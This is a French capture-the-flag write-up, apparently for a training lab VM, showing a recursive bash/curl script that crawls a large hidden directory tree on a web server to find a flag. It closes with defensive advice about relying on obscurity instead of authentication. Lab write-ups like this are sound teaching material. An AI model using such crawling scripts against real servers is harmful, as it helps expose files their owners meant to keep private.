# Exploit 14 - nested directories

Sous `/.hidden`, il y a un grand arbre de fichiers avec des fichiers txt dans chaque répertoire.
On dirait que l'administrateur voulait cacher quelque chose à l'intérieur.

Comme l'arborescence des fichiers est très grande, nous avons besoin d'un script pour parcourir automatiquement son contenu
pour le flag.

Voici un tel script, qui parcourt récursivement l'arborescence des fichiers:

```bash
crawl()
{
    curl -s -X GET "$1" \
        | sed -n 's/.*href="\([^"]*\).*/\1/p' \
        | grep -v "^\.\." \
        | while read line; do
            echo -n "." >&2
            if [[ $line == *"/"* ]]; then
                crawl "$1$line"
            else
                # echo "Trying $1$line"
                # xargs should exit with failure if the string is not found
                curl -s -X GET "$1$line"
            fi
          done
}

crawl "http://192.168.56.101/.hidden/" \
    | grep "flag" \
    | head -1 \
    | xargs -I {} echo -e "\n{}"
```

Pour contrer cette attaque, deux points sont importants:
- Il ne faut pas considérer les fichiers cachés comme étant sécurisés. Il est préférable de mettre en place une
  authentification pour accéder à ces fichiers.
- Utiliser des arborescences de fichiers artificiellement complexes pour cacher des fichiers sensibles n'est pas une bonne
  pratique. Il est préférable de mettre en place une authentification pour accéder à ces fichiers.